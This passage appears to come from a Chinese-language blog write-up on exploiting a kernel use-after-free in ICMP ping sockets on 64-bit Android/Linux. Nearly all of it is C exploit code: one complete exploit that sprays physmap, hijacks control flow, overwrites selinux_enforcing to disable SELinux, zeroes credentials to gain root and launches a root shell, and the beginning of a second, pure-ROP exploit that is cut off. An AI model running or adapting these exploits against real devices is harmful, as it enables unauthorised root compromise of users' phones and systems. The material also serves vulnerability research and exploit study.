PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(MAP_FAILED == user_mm)</span><br><span class="line">    &#123;</span><br><span class="line">          perror(<span class="string">&quot;[-] mmap NULL fail&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;MAX_NULLMAP_SIZE/PAGE_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="built_in">memset</span>((<span class="keyword">char</span> *)user_mm + PAGE_SIZE * i, <span class="number">0x90</span>, PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;MAX_VULTRIG_SOCKS_COUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">-1</span> == ret)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] create vultrig socket fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">-1</span> == ret)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] connect vultrig socket fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] physmap spray begin.\\n&quot;</span>);</span><br><span class="line">      <span class="built_in">memset</span>(physmap_spray_pages,    <span class="number">0</span>,   <span class="keyword">sizeof</span>(physmap_spray_pages));</span><br><span class="line">    <span class="built_in">memset</span>(physmap_spray_children, <span class="number">0</span>,     <span class="keyword">sizeof</span>(physmap_spray_children));</span><br><span class="line">      physmap_spray_pages_count   =  <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;MAX_PHYSMAP_SPRAY_PROCESS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="number">-1</span> == spray_nofork(MAX_PHYSMAP_SIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;[*] physmap spray fail.\\n&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] physmap spray done.\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    exp_sock_index = MAX_VULTRIG_SOCKS_COUNT / <span class="number">2</span>;</span><br><span class="line">    exp_sock = search_exploitable_socket(&amp;exp_sock_index, &amp;payload);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == exp_sock)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] can&#x27;t search exploitable socket.\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    to avoid 64bit exp crash in ip_mc_drop_socket</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC0004323D8                 LDR             X19, [X22,#0x2A0]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC0004323DC                 CBZ             X19, loc_FFFFFFC00043243C</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x2a0</span>)  = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    hijack PC here</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC00042E394                 MOV             X0, X19</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC00042E398                 LDR             X2, [X19,#0x28]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC00042E39C                 LDR             X2, [X2]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC00042E3A0                 BLR             X2 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    call kernel_setsockopt to set addr_limit 0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C6C                 STP             X29, X30, [SP,#var_20]!</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C70                 MOV             X6, #0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C74                 CMP             W1, #1</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C78                 MOV             X5, SP</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C7C                 MOV             X29, SP</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C80                 AND             X5, X5, #0xFFFFFFFFFFFFC000</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C84                 STR             X19, [SP,#0x20+var_10]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C88                 LDR             X19, [X5,#8]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C8C                 STR             X6, [X5,#8]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C90                 B.EQ            loc_FFFFFFC000383CB8</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C94                 LDR             X5, [X0,#0x28]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C98                 LDR             X5, [X5,#0x68]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383C9C                 BLR             X5</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383CA0                 MOV             X1, SP</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383CA4                 AND             X1, X1, #0xFFFFFFFFFFFFC000</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383CA8                 STR             X19, [X1,#8]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383CAC                 LDR             X19, [SP,#0x20+var_10]</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383CB0                 LDP             X29, X30, [SP+0x20+var_20],#0x20</span></span><br><span class="line"><span class="comment">    ROM:FFFFFFC000383CB4                 RET</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x28</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)payload;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload)         = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC000383C6C</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x68</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC000383CAC</span>;</span><br><span class="line">    close(exp_sock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now we can R/W kernel address space like a boss.\\n&quot;</span>);</span><br><span class="line">    <span class="comment">/*now we can RW kernel address spcae like a boss.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    overwirte selinux_enforcing to disable selinux</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    data4 = <span class="number">0</span>;</span><br><span class="line">    kernel_write4((<span class="keyword">void</span> *)(<span class="number">0xFFFFFFC0006D6E7F</span> + <span class="number">0x14ACD</span>), &amp;data4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] selinux disabled.\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    exp_sock = <span class="number">-1</span>;</span><br><span class="line">    exp_sock_index = exp_sock_index + <span class="number">1</span>;</span><br><span class="line">    exp_sock = search_exploitable_socket(&amp;exp_sock_index, &amp;payload);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == exp_sock)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] can&#x27;t search exploitable socket.\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *sp = jop(exp_sock, payload);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *sp_task = ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)sp &amp; <span class="number">0xFFFFFFFFFFFFC000</span>) + <span class="number">0x10</span>;</span><br><span class="line">    task = <span class="literal">NULL</span>;</span><br><span class="line">    kernel_read8(sp_task, &amp;task);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        overwrite task_struct-&gt;cred to gain root privilege</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] task:%p\\n&quot;</span>, task); </span><br><span class="line"></span><br><span class="line">    cred = <span class="literal">NULL</span>;</span><br><span class="line">    kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x398</span>, &amp;cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] cred:%p\\n&quot;</span>, cred);</span><br><span class="line"></span><br><span class="line">    data4 = <span class="number">0</span>;</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">4</span>,  &amp;data4);</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">8</span>,  &amp;data4);</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">12</span>,  &amp;data4);</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">16</span>,  &amp;data4);</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">20</span>,  &amp;data4);</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">24</span>,  &amp;data4);</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">28</span>,  &amp;data4);</span><br><span class="line">    kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">32</span>,  &amp;data4);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        cleanup to avoid crash. overwirte task_struct-&gt;files-&gt;fdt-&gt;max_fds to 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x788</span>, &amp;files);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] files:%p\\n&quot;</span>, files);</span><br><span class="line"></span><br><span class="line">    kernel_read8((<span class="keyword">char</span> *)files + <span class="number">8</span>, &amp;fdt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] fdt:%p\\n&quot;</span>, fdt);</span><br><span class="line"></span><br><span class="line">    data4 = <span class="number">0</span>;</span><br><span class="line">    kernel_write4(fdt, &amp;data4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] congrats, enjoy your root shell.\\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Oops, you&#x27;d better have a cup of tea and try again:(\\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

        <h3 id="第三种exp-纯-kernel-ROP"   >
          <a href="#第三种exp-纯-kernel-ROP" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三种exp-纯-kernel-ROP" class="headerlink" title="第三种exp - 纯 kernel ROP"></a>第三种exp - 纯 kernel ROP</h3>
      <p>以下是我用纯rop完成利用的exp</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_SOCK_NUM 4000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_MMAP_NUM 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_MMAP_SIZE 128*1024*1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_STAMP_OFFSET 0x1E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIOCGSTAMPNS 0x8907</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSEC_PER_SEC 1000000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_VALUE 0x66666666          <span class="comment">// test before use</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_STACK_SIZE 0x200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vuln_sock[MAX_SOCK_NUM];</span><br><span class="line"><span class="keyword">void</span>* mmaped[MAX_MMAP_NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mmap_page_count;</span><br><span class="line"><span class="keyword">void</span>* mmap_per_page[(ONE_MMAP_SIZE/PAGE_SIZE) * MAX_MMAP_NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vuln_sock_index;</span><br><span class="line"><span class="keyword">void</span>* vuln_page;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maximize_fd_limit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">    setrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">    getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">    <span class="keyword">return</span> rlim.rlim_cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap200200</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span> *addr;</span><br><span class="line">    addr = mmap((<span class="keyword">void</span>*)<span class="number">0x200000</span>, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to mmap 0x200200\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">unsigned</span>*)addr = <span class="number">0x100</span>;</span><br><span class="line">    ret = mlock(addr,PAGE_SIZE);</span><br><span class="line">    <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to mlock 0x200200\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_vuln_socks</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa1</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa1,<span class="number">0x0</span>,<span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    sa1.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa2</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa2,<span class="number">0x0</span>,<span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    sa2.sin_family = AF_UNSPEC;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_SOCK_NUM; i++)&#123;</span><br><span class="line">        vuln_sock[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);</span><br><span class="line">        <span class="keyword">if</span>(vuln_sock[i] &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;create socket error: %s (%d)&quot;</span>, strerror(errno), errno);</span><br><span class="line">        &#125;</span><br><span class="line">        connect(vuln_sock[i],&amp;sa1,<span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_SOCK_NUM; i++)&#123;</span><br><span class="line">        connect(vuln_sock[i],&amp;sa2,<span class="keyword">sizeof</span>(sa2));</span><br><span class="line">        connect(vuln_sock[i],&amp;sa2,<span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap_spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* mapped_page;</span><br><span class="line"></span><br><span class="line">    mmap_page_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_MMAP_NUM; i++)&#123;</span><br><span class="line">        mmaped[i] = mmap(<span class="literal">NULL</span>, ONE_MMAP_SIZE , PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// PRIVATE POPULATE? seems unnecessary</span></span><br><span class="line">        <span class="keyword">if</span>(mmaped[i] == MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap failed\\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ;j &lt; ONE_MMAP_SIZE/PAGE_SIZE; j++)&#123;</span><br><span class="line">            <span class="built_in">memset</span>((<span class="keyword">char</span>*)mmaped[i],<span class="number">0x41</span>,PAGE_SIZE);                 </span><br><span class="line">            mapped_page = (<span class="keyword">void</span>*)((<span class="keyword">char</span>*)mmaped[i]+j*PAGE_SIZE);</span><br><span class="line">            *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)mapped_page + SK_STAMP_OFFSET) = MAGIC_VALUE +  mmap_page_count;</span><br><span class="line">            mmap_per_page[mmap_page_count] = mapped_page;</span><br><span class="line">            mmap_page_count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [-] %d/%d\\n&quot;</span>,i+<span class="number">1</span>, MAX_MMAP_NUM);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_target_sk</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">time</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> compare_value;</span><br><span 